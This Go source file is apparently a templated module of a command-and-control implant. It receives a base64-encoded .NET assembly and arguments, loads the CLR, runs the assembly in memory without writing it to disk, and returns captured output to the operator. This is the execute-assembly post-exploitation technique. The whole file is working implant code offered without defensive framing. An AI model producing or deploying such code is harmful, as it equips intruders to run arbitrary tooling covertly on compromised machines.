import (
	"encoding/base64"
	"fmt"
	"strings"

	"agents/go-clr"
)

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3)
	if len(parts) < 2 {
		return "[ERROR] Invalid assembly command format. Usage: assembly <base64_encoded_assembly> [base64_encoded_arguments]"
	}

	encodedAssembly := parts[1]
	var encodedArguments string
	if len(parts) >= 3 {
		encodedArguments = parts[2]
	}

	assemblyBytes, err := base64.StdEncoding.DecodeString(encodedAssembly)
	if err != nil {
		return fmt.Sprintf("[ERROR] Invalid assembly data format: %v", err)
	}

	var args []string
	if encodedArguments != "" {
		argumentsBytes, err := base64.StdEncoding.DecodeString(encodedArguments)
		if err != nil {
			return fmt.Sprintf("[ERROR] Invalid arguments data format: %v", err)
		}
		argumentsStr := string(argumentsBytes)
		if argumentsStr != "" {
			args = parseArguments(argumentsStr)
		}
	} else {
		args = []string{}
	}

	rtHost, err := clr.LoadCLR("v4")
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to load CLR: %v", err)
	}

	err = clr.RedirectStdoutStderr()
	if err != nil {
	}

	assembly, err := clr.LoadAssembly(rtHost, assemblyBytes)
	if err != nil {
		rtHost.Release()
		return fmt.Sprintf("[ERROR] Failed to load assembly: %v", err)
	}

	stdout, stderr := clr.InvokeAssembly(assembly, args)

	assembly.Release()
	rtHost.Release()

	output := stdout
	if stderr != "" {
		if output != "" {
			output += "\n"
		}
		output += "[STDERR] " + stderr
	}

	if output == "" {
		if len(args) > 0 {
			return fmt.Sprintf("[SUCCESS] .NET assembly executed with arguments '%v' and no output", args)
		} else {
			return "[SUCCESS] .NET assembly executed with no output"
		}
	}

	return output
}

func parseArguments(input string) []string {
	var args []string
	var currentArg string
	inQuotes := false
	escapeNext := false

	for i, char := range input {
		if escapeNext {
			currentArg += string(char)
			escapeNext = false
			continue
		}

		switch char {
		case '\\':
			if i+1 < len(input) {
				escapeNext = true
				continue
			} else {
				currentArg += string(char)
			}
		case '"':
			if !inQuotes {
				inQuotes = true
			} else {
				inQuotes = false
			}
		case ' ':
			if !inQuotes {
				if currentArg != "" {
					args = append(args, currentArg)
					currentArg = ""
				}
			} else {
				currentArg += string(char)
			}
		default:
			currentArg += string(char)
		}
	}

	if currentArg != "" {
		args = append(args, currentArg)
	}

	return args
}